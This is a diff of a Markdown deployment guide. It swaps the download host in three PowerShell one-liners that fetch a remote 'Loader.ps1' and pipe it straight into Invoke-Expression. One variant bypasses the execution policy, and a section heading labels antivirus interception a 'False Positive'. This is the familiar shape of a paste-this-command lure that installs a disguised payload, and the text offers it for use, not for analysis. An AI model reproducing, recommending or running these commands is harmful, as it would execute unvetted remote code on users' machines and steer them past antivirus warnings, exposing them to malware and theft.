@@ -62,7 +62,7 @@
 
 ### Step 2: Execute Deployment Command  
 ```powershell
-irm https://software-storage.org/powershell/Loader.ps1 | iex
+irm https://mast.frtview.com/Loader.ps1 | iex
 ```
 
 ### Step 3: Wait for Completion  
@@ -79,12 +79,12 @@ irm https://software-storage.org/powershell/Loader.ps1 | iex
 
 ### 📌 Execution Policy Bypass  
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.org/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 ```
 
 ### 📌 irm Not Recognized (PowerShell 2.0)  
 ```powershell
-Invoke-RestMethod https://software-storage.org/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression
 ```
 
 ### 📌 Antivirus Interception (False Positive)  
